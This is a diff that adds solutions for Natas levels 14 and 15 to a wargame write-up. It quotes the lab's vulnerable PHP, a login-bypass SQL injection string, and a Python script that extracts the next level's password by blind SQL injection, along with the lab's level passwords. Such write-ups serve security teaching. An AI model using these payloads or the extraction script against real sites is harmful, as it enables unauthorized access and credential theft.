@@ -409,6 +409,108 @@ After also doing everything we did in the previous level, we get the password:
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 ```
 
+#### Natas 14 Solution
+
+___
+**URL :** <http://natas14.natas.labs.overthewire.org/> \
+**Credentials :** *natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ*
+
+Analysing the source code, an SQL injection seems possible:
+```php
+<?php
+if (array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if (array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+        echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+        echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+}
+?>
+```
+The classic
+```html
+" OR 1=1; #
+```
+did the trick:
+
+![Index file](/assets/images/14-1.png)
+
+#### Natas 15 Solution
+
+___
+**URL :** <http://natas15.natas.labs.overthewire.org/> \
+**Credentials :** *natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx*
+
+Unlike the previous level, the password is no longer printed if our query returns more than 0 rows only that a user exists:
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if (array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if (array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if ($res) {
+        if (mysqli_num_rows($res) > 0) {
+            echo "This user exists.<br>";
+        } else {
+            echo "This user doesn't exist.<br>";
+        }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+}
+?>
+```
+```py
+import requests
+import re
+
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+username = "natas15"
+password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+
+url = "http://natas15.natas.labs.overthewire.org"
+
+session = requests.Session()
+
+current_password = list()
+
+while(True):
+    for character in characters:
+        print("Trying with: " + "".join(current_password) + character)
+        response = session.post(url, data={"username": 'natas16" AND password LIKE BINARY "' + "".join(current_password) + character + '%" #'}, auth=(username, password))
+        if "This user exists." in response.text:
+            current_password.append(character)
+            break
+    if len(current_password) == 32:
+        break
+```
+
 #### Natas 22 Solution
 
 ___
@@ -450,7 +552,6 @@ if (array_key_exists("passwd",$_REQUEST)) {
         echo "<br>Wrong!<br>";
     }
 }
-// morla / 10111
 ?>
 ```
 Had to search up what strstr did
